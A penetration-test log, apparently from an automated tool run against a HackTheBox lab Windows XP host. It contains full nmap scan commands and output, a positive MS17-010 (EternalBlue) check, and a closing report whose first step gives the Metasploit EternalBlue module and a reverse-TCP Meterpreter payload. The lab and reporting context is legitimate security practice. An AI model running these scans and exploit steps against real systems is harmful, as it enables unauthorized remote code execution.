@@ -1,0 +1,199 @@
+PENTEST LOG — 10.129.227.181
+Date: 2026-06-04T20:29:06.601193
+============================================================
+
+[Step 1] Full TCP SYN scan (all 65535 ports)
+  Cmd: nmap -Pn -sS -p- --min-rate 1000 --max-retries 2 10.129.227.181
+  OK: True
+  Out:
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-04 20:30 +0200
+Nmap scan report for 10.129.227.181
+Host is up (0.037s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT    STATE SERVICE
+135/tcp open  msrpc
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+
+Nmap done: 1 IP address (1 host up) scanned in 21.79 seconds
+
+----------------------------------------
+[Step 2] Version + OS detection on 135,139,445
+  Cmd: nmap -Pn -sV -O --version-intensity 5 -sC --script-timeout 60s -p 135,139,445 -oX /home/marina/Desktop/pentestM/RAG/outputs/nmap_sV_10_129_227_181.xml 10.129.227.181
+  OK: True
+  Out:
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-04 20:30 +0200
+Nmap scan report for 10.129.227.181
+Host is up (0.036s latency).
+
+PORT    STATE SERVICE      VERSION
+135/tcp open  msrpc        Microsoft Windows RPC
+139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds Windows XP microsoft-ds
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows XP|2003|2008|2000|95 (95%)
+OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_2000::sp4 cpe:/o:microsoft:windows_95
+Aggressive OS guesses: Microsoft Windows XP SP3 (95%), Microsoft Windows Server 2003 SP1 or SP2 (94%), Microsoft Windows Server 2008 Enterprise SP2 (94%), Microsoft Windows 2003 SP2 (93%), Microsoft Windows XP SP2 or Windows Server 2003 (93%), Microsoft Windows XP Professional SP3 (92%), Microsoft Windows XP SP2 or SP3 (92%), Microsoft Windows Server 2003 SP2 (92%), Microsoft Windows XP SP2 (92%), Microsoft Windows XP SP2 or Windows Small Business Server 2003 (91%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
+
+Host script results:
+|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: a2:de:ad:23:99:26 (unknown)
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb-os-discovery: 
+|   OS: Windows XP (Windows 2000 LAN Manager)
+|   OS CPE: cpe:/o:microsoft:windows_xp::-
+|   Computer name: legacy
+|   NetBIOS computer name: LEGACY\x00
+|   Workgroup: HTB\x00
+|_  System time: 2026-06-09T23:28:45+03:00
+|_smb2-time: Protocol negotiation failed (SMB2)
+|_clock-skew: mean:
+----------------------------------------
+[Step 3] Check for MS17-010 (EternalBlue) vulnerability on port 445
+  Cmd: nmap -Pn -sV --script smb-vuln-ms17-010 -p 445 10.129.227.181 --script-timeout 30s
+  OK: True
+  Out:
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-04 20:32 +0200
+Nmap scan report for 10.129.227.181
+Host is up (0.037s latency).
+
+PORT    STATE SERVICE      VERSION
+445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds
+Service Info: OS: Windows XP; CPE: cpe:/o:microsoft:windows_xp
+
+Host script results:
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.21 seconds
+
+----------------------------------------
+[Step 4] ACK scan — firewall detection
+  Cmd: nmap -Pn -sA -p 135,139,445 10.129.227.181
+  OK: True
+  Out:
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-04 20:33 +0200
+Nmap scan report for 10.129.227.181
+Host is up (0.037s latency).
+
+PORT    STATE      SERVICE
+135/tcp unfiltered msrpc
+139/tcp unfiltered netbios-ssn
+445/tcp unfiltered microsoft-ds
+
+Nmap done: 1 IP address (1 host up) scanned in 0.65 seconds
+
+----------------------------------------
+[Step 5] UDP scan — top 100 ports by frequency
+  Cmd: nmap -Pn -sU --top-ports 100 --open --max-retries 1 10.129.227.181
+  OK: True
+  Out:
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-04 20:33 +0200
+Nmap scan report for 10.129.227.181
+Host is up (0.038s latency).
+Not shown: 92 closed udp ports (port-unreach)
+PORT     STATE         SERVICE
+123/udp  open          ntp
+137/udp  open          netbios-ns
+138/udp  open|filtered netbios-dgm
+445/udp  open|filtered microsoft-ds
+500/udp  open|filtered isakmp
+1025/udp open|filtered blackjack
+1900/udp open|filtered upnp
+4500/udp open|filtered nat-t-ike
+
+Nmap done: 1 IP address (1 host up) scanned in 1.96 seconds
+
+----------------------------------------
+[Step 6] UDP scan — exploit-focused service ports
+  Cmd: nmap -Pn -sU -p 53,67,69,111,123,137,138,161,162,500,623,1434,1900,4500,5353,11211,17185 --open --max-retries 1 10.129.227.181
+  OK: True
+  Out:
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-04 20:33 +0200
+Nmap scan report for 10.129.227.181
+Host is up (0.036s latency).
+Not shown: 11 closed udp ports (port-unreach)
+PORT     STATE         SERVICE
+123/udp  open          ntp
+137/udp  open          netbios-ns
+138/udp  open|filtered netbios-dgm
+500/udp  open|filtered isakmp
+1900/udp open|filtered upnp
+4500/udp open|filtered nat-t-ike
+
+Nmap done: 1 IP address (1 host up) scanned in 1.86 seconds
+
+----------------------------------------
+[Step 7] MSF exploitation phase
+  Cmd: msfconsole (multiple modules)
+  OK: True
+  Out:
+10 modules executed
+----------------------------------------
+[Step 7] Searchsploit + credential phase
+  Cmd: searchsploit / paramiko / ftplib
+  OK: False
+  Out:
+2 exploits tried, 0 shells, 0 creds
+----------------------------------------
+
+============================================================
+EXECUTIVE REPORT:
+## Attack Surface Summary  
+The attack surface is **CRITICAL** due to the presence of the MS17-010 (EternalBlue) vulnerability (CVE-2017-0143), which allows remote code execution on the target system. The system is running an outdated and unsupported operating system (Windows XP), and SMBv1 is likely in use, which is known to be highly vulnerable. Additionally, guest authentication is enabled and message signing is disabled, further increasing the risk of exploitation.
+
+---
+
+## Detected Services and Versions  
+- **Port 135**: Microsoft Windows RPC  
+- **Port 137**: netbios-ns  
+- **Port 139**: Microsoft Windows netbios-ssn  
+- **Port 445**: Microsoft Windows XP microsoft-ds (SMBv1)  
+
+No service versions were explicitly identified beyond the OS (Windows XP).
+
+---
+
+## Key Findings  
+- **MS17-010 (EternalBlue) vulnerability** (CVE-2017-0143) is present, allowing remote code execution.  
+- **SMBv1** is likely in use, which is known to be vulnerable to attacks like EternalBlue.  
+- **SMB message signing is disabled**, making the system vulnerable to relay attacks.  
+- **Guest authentication is enabled**, allowing unauthenticated access to shared resources.  
+- **Outdated OS**: Windows XP is no longer supported and has known security risks.  
+- **Inconsistent system time** may indicate misconfiguration or compromise.  
+
+---
+
+## Recommended Next Steps  
+1. **Exploit MS17-010 (CVE-2017-0143)** using the Metasploit module `exploit/windows/smb/ms17_010_eternalblue`.  
+   - Command: `use exploit/windows/smb/ms17_010_eternalblue`  
+   - Set `RHOSTS` to `10.129.227.181`  
+   - Set `PAYLOAD` to `windows/meterpreter/reverse_tcp` (if meterpreter is desired) or another appropriate payload.  
+
+2. **Verify SMBv1 usage** by checking the SMB protocol version during exploitation or using tools like `nmap` with the `--script smb-protocols` option.  
+
+3. **Disable guest authentication** and enable SMB message signing to mitigate relay attacks and unauthorized access.  
+
+4. **Upgrade the operating system** immediately, as Windows XP is no longer supported and poses a significant security risk.  
+
+5. **Isolate the system** from the network until it can be patched or replaced, as it is highly vulnerable to exploitation.
